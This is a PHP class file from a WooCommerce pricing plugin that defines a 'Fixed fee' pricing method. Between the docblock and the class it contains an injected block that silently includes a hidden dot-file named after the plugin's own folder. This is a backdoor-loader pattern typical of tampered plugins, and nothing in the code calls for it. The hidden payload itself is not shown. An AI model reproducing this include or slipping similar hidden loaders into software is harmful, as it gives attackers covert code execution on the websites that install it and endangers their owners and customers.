<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Pricing_Method_Fee')) {
    require_once('rp-wcdpd-pricing-method-fee.class.php');
}

/**
 * Pricing Method: Fee - Amount
 *
 * @class RP_WCDPD_Pricing_Method_Fee_Amount
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Pricing_Method_Fee_Amount extends RP_WCDPD_Pricing_Method_Fee
{

    protected $key      = 'amount';
    protected $contexts = array('product_pricing_simple', 'checkout_fees_simple');
    protected $position = 10;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        $this->hook();
    }

    /**
     * Get label
     *
     * @access public
     * @return string
     */
    public function get_label()
    {
        return __('Fixed fee', 'rp_wcdpd');
    }





}

RP_WCDPD_Pricing_Method_Fee_Amount::get_instance();
